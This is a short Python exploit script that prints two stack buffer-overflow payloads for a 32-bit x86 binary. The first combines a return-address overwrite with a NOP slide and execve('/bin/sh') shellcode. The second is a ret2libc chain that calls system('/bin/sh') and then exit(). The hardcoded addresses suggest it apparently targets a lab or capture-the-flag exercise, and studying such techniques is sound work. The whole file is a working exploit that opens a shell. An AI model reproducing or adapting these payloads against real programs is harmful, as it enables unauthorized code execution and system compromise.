import sys
import struct


def rop_with_shellcode() -> bytes:
    padding = b'AAAA'*20
    ret = struct.pack('I', 0x80484f9) # return to itself
    next_ret = struct.pack('I', 0xbffff7ac + 50)
    nopslide = b'\x90\x90\x90\x90'*100

    # shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
    payload = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

    return (padding + ret + next_ret + nopslide + payload)


def ret2libc() -> bytes:
    padding = b'AAAA'*20
    ret = struct.pack('I', 0xb7ecffb0) # return to system() at (0xb7e97000 + 0x00038fb0)
    return_after_system = struct.pack('I', 0xb7ec60c0) # exit() at 0xb7ec60c0
    bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

    return (padding + ret + return_after_system + bin_sh)


def main(argv):
    try:
        if argv[1] == '--rop':
            exploit = rop_with_shellcode()
            sys.stdout.buffer.write(exploit)
            sys.stdout.flush()

        elif argv[1] == '--ret2libc':
            exploit = ret2libc()
            sys.stdout.buffer.write(exploit)
            sys.stdout.flush()

    except:
        print(f'param error: \n\n\t{argv[0]} --rop | --ret2libc \n')


main(sys.argv)